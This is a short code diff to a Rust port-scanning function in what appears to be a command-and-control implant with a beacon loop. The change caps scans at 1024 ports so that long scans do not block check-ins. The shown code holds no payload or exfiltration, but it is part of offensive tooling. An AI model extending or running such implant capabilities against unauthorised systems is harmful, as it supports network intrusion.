@@ -614,6 +614,14 @@ pub fn do_portscan(host: &str, ports: &str) -> Response {
     if targets.is_empty() {
         return Response::Err("portscan: no valid ports specified".into());
     }
+    // Cap the scan (implant-misc-5): every port costs up to 250 ms of
+    // synchronous `select` in the single-threaded beacon loop, so an
+    // unbounded range ("1-65535") would blackout check-ins for hours.
+    // Reject wide ranges loudly instead of silently scanning forever.
+    const MAX_SCAN_PORTS: usize = 1024;
+    if targets.len() > MAX_SCAN_PORTS {
+        return Response::Err("portscan: too many ports (max 1024) — narrow the range".into());
+    }
     if !force_load(b"ws2_32.dll") {
         return Response::Err("portscan: ws2_32.dll load failed".into());
     }
